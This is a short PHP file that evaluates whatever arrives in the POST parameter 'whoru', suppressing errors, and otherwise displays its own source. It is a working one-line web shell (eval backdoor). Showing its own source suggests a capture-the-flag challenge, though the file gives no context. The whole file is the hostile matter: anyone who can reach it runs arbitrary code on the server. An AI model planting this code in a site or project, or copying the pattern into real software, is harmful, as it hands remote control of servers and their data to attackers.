<?php
if(isset($_POST['whoru'])){
    @eval($_POST['whoru']);
}else{
    highlight_file(__FILE__);
}
?>
